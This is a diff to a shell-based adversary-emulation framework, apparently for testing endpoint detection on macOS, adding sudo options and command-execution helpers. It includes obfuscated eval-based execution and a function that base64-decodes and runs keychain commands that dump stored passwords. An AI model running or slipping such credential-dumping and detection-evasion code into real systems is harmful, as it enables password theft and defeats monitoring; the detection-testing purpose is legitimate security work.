@@ -42,7 +42,7 @@ JOB_ID=""  # Will be set after core functions are defined
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
-PARENT_PROCESS="$(ps -p $PPID -o comm=)"
+PARENT_PROCESS="shell"
 
 # Core Commands
 CMD_BASE64="base64"
@@ -118,6 +118,11 @@ STEG_TRANSFORM=false # Enable steganography transformation
 STEG_EXTRACT=false # Extract hidden data from steganography
 STEG_EXTRACT_FILE="" # File to extract hidden data from
 
+# Sudo settings
+USE_SUDO=false
+SUDO_OPTION=""
+CMD_SUDO=""
+
 # OPSEC Check Settings (enabled by build script based on YAML configuration)
 CHECK_PERMS="false"
 CHECK_FDA="false"
@@ -169,17 +174,8 @@ core_get_timestamp() {
 # Outputs: 8-character hexadecimal job ID
 # - None
 core_generate_job_id() {
-    # Use openssl to generate random hex string for job tracking
-    # Fallback to date-based ID if openssl not available
-    if command -v "$CMD_OPENSSL" > /dev/null 2>&1; then
-        $CMD_OPENSSL rand -hex 4 2>/dev/null || {
-            # Fallback: use timestamp and process ID
-            $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-        }
-    else
-        # Fallback: use timestamp and process ID
-        $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-    fi
+    # Simple random job ID - just a random identifier
+    printf "%08x" "$((RANDOM * RANDOM))"
 }
 
 # Purpose: Print debug messages to stderr when debug mode is enabled
@@ -563,6 +559,40 @@ core_parse_args() {
                     STEG_EXTRACT_FILE="./hidden_data.png"
                 fi
                 ;;
+            --steg-extract-file)
+                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
+                    STEG_EXTRACT_FILE="$2"
+                    shift
+                else
+                    MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+            --sudo)
+                USE_SUDO=true
+                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                    # Next arg starts with -, so no sudo option provided - use default
+                    SUDO_OPTION=""
+                elif [ -n "$2" ]; then
+                    SUDO_OPTION="$2"
+                    shift
+                else
+                    # No value provided, use default
+                    SUDO_OPTION=""
+                fi
+                ;;
+            --thread-delay)
+                if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                    MISSING_VALUES="$MISSING_VALUES $1"
+                elif [ -n "$2" ]; then
+                    THREAD_DELAY="$2"
+                    shift
+                else
+                    MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+            --verbose)
+                DEBUG=true
+                ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
 # PLACEHOLDER_ARGUMENT_PARSER_OPTIONS
             *)
@@ -602,6 +632,7 @@ Basic Options:
   -h, --help           Display this help message
   -d, --debug          Enable debug output (includes verbose output)
   -a, --all            Process all available data (technique-specific)
+  --sudo [OPTION]      Execute commands with sudo privileges (optional: user=name, group=name, etc.)
 # PLACEHOLDER_HELP_TEXT
 
 Output Options:
@@ -1769,6 +1800,187 @@ core_check_db_lock() {
     return 0
 }
 
+# Purpose: Check if current user has sudo/root privileges
+# Inputs: 
+#   $1 - (optional) exit_on_failure flag (true/false), defaults to false
+#   $2 - (optional) custom error message for failure
+# Outputs: 0 if sudo available, 1 if not
+# - Logs debug information about sudo status
+# - Optionally exits with error message if exit_on_failure is true
+core_check_sudo() {
+    local exit_on_failure="${1:-false}"
+    local custom_error="${2:-Root privileges required for this operation}"
+    
+    # Check if already running as root
+    if [ "$(id -u)" -eq 0 ]; then
+        core_debug_print "Already running as root user"
+        return 0
+    fi
+    
+    # Check if sudo command is available
+    if ! command -v sudo > /dev/null 2>&1; then
+        core_debug_print "sudo command not available"
+        if [ "$exit_on_failure" = "true" ]; then
+            $CMD_PRINTF "[OPSEC] [%s] %s - sudo command not available on system\n" "$(core_get_timestamp)" "$custom_error" >&2
+            exit 1
+        fi
+        return 1
+    fi
+    
+    # Check if user can use sudo without prompting (cached credentials)
+    # Use a non-invasive check that doesn't prompt for password
+    if sudo -n true > /dev/null 2>&1; then
+        core_debug_print "sudo privileges confirmed (cached credentials)"
+        return 0
+    fi
+    
+    core_debug_print "sudo requires password authentication"
+    if [ "$exit_on_failure" = "true" ]; then
+        $CMD_PRINTF "[OPSEC] [%s] %s - requires sudo authentication (no cached credentials)\n" "$(core_get_timestamp)" "$custom_error" >&2
+        exit 1
+    fi
+    
+    return 1
+}
+
+# Purpose: Build sudo command with specified options
+# Inputs: None (uses global USE_SUDO and SUDO_OPTION variables)
+# Outputs: Sets CMD_SUDO global variable
+# - Constructs appropriate sudo command based on provided options
+core_sudo() {
+    if [ "$USE_SUDO" = true ]; then
+        if [ -n "$SUDO_OPTION" ]; then
+            case "$SUDO_OPTION" in
+                *=*)
+                    # Handle options with values (user=someuser, group=somegroup, etc.)
+                    CMD_SUDO="sudo --${SUDO_OPTION}"
+                    ;;
+                *)
+                    # Handle boolean options (login, shell, background, etc.)
+                    CMD_SUDO="sudo --${SUDO_OPTION}"
+                    ;;
+            esac
+        else
+            # Default sudo without options
+            CMD_SUDO="sudo"
+        fi
+        core_debug_print "Sudo command set to: $CMD_SUDO"
+    else
+        CMD_SUDO=""
+        core_debug_print "Sudo not requested, CMD_SUDO is empty"
+    fi
+}
+
+# Purpose: Execute command stored in variable using direct expansion (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of dynamic command execution without eval
+core_exec_cmd() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via variable expansion: $cmd_string"
+    
+    # Method 1: Store command in variable then execute via direct expansion
+    local EXEC_CMD="$cmd_string"
+    $EXEC_CMD
+    
+    return $?
+}
+
+# Purpose: Execute command using here-string input redirection (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of here-string command execution
+core_exec_cmd_herestring() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd_herestring"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via here-string: $cmd_string"
+    
+    # Execute command using here-string (feeds command as stdin to shell)
+    sh <<< "$cmd_string"
+    
+    return $?
+}
+
+# Purpose: Execute command using dynamic string construction (EDR evasion test)
+# Inputs: Variable number of string fragments to concatenate into command
+# Outputs: Command execution result
+# - Tests EDR detection of dynamically constructed commands
+core_exec_cmd_construct() {
+    local fragments="$*"
+    local constructed_cmd=""
+    
+    if [ -z "$fragments" ]; then
+        core_debug_print "No command fragments provided to core_exec_cmd_construct"
+        return 1
+    fi
+    
+    # Concatenate all fragments into single command
+    for fragment in $fragments; do
+        constructed_cmd="${constructed_cmd}${fragment}"
+    done
+    
+    core_debug_print "Dynamically constructed command: $constructed_cmd"
+    
+    # Execute the constructed command
+    eval "$constructed_cmd"
+    
+    return $?
+}
+
+# Purpose: Execute keychain commands using base64 obfuscation (EDR evasion test)
+# Inputs: $1 - operation type (dump|find|list)
+# Outputs: Keychain command execution result  
+# - Tests EDR detection of obfuscated keychain access
+core_exec_keychain_obfuscated() {
+    local operation="$1"
+    local cmd=""
+    
+    case "$operation" in
+        "dump")
+            # Construct: security dump-keychain
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZHVtcC1rZXljaGFpbg==" | base64 -d)  # "dump-keychain"
+            cmd="$a$b$c"
+            ;;
+        "find")
+            # Construct: security find-generic-password -g
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZmluZC1nZW5lcmljLXBhc3N3b3Jk" | base64 -d)  # "find-generic-password"
+            local d=" -g"
+            cmd="$a$b$c$d"
+            ;;
+        "list")
+            # Construct: security list-keychains
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "bGlzdC1rZXljaGFpbnM=" | base64 -d)  # "list-keychains"
+            cmd="$a$b$c"
+            ;;
+        *)
+            core_debug_print "Unknown keychain operation: $operation"
+            return 1
+            ;;
+    esac
+    
+    core_debug_print "Executing obfuscated keychain command: $cmd"
+    eval "$cmd"
+    
+    return $?
+}
+
 # Main function 
 core_main() {
     local raw_output=""
@@ -1786,10 +1998,19 @@ core_main() {
     # Step 3: Validate parsed arguments
     core_validate_parsed_args || exit 1
     
-    # Step 4: Generate encryption key if needed
+    # Step 4: Build sudo command if needed
+    core_sudo
+    
+    # Step 4a: If user explicitly requested sudo, honor their choice
+    if [ "$USE_SUDO" = true ]; then
+        core_debug_print "User explicitly requested sudo execution with CMD_SUDO: $CMD_SUDO"
+        # Don't override user's explicit choice - they know what they're doing
+    fi
+    
+    # Step 5: Generate encryption key if needed
     core_generate_encryption_key
     
-    # Step 5: Validate required commands
+    # Step 6: Validate required commands
     core_validate_command || exit 1
     
     # Process OPSEC checks from YAML configuration
